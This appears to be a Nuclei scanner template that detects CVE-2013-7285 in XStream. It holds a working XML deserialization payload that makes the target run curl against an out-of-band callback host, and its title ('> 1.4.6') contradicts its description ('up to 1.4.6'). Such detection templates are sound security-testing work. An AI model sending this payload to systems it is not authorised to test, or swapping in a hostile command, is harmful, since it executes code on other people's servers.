id: CVE-2013-7285
info:
  name: XStream > 1.4.6 - Remote Code Execution
  author: pwnhxl
  severity: critical
  description: XStream API versions up to 1.4.6 and version 1.4.10 may allow a remote
    attacker to execute arbitrary code through unmarshaling XML or any supported format
    if the security framework has not been initialized.
  reference:
  - http://x-stream.github.io/CVE-2013-7285.html
  - https://x-stream.github.io/CVE-2013-7285.html
  - https://www.mail-archive.com/user@xstream.codehaus.org/msg00607.html
  - https://www.mail-archive.com/user@xstream.codehaus.org/msg00604.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2013-7285
    cwe-id: CWE-78
  tags: cve,cve2013,xstream,deserialization,rce,oast
  metadata:
    impact: The CVE-2013-7285 vulnerability in XStream API versions up to 1.4.6 and
      version 1.4.10 allowed remote attackers to execute arbitrary shell commands
      through unmarshaling XML or any supported format, impacting the security of
      systems using the affected versions.
    recommendation: I recommend updating XStream API to version 1.4.11 or later to
      mitigate the remote code execution vulnerability identified in CVE-2013-7285.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<contact\
    \ class='dynamic-proxy'>\n  <interface>org.company.model.Contact</interface>\n\
    \  <handler class='java.beans.EventHandler'>\n    <target class='java.lang.ProcessBuilder'>\n\
    \      <command>\n        <string>curl http://{{interactsh-url}} -H 'User-Agent:\
    \ {{rand_base(6)}}'</string>\n      </command>\n    </target>\n    <action>start</action>\n\
    \  </handler>\n</contact>\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: {{rand_base(6)}}'
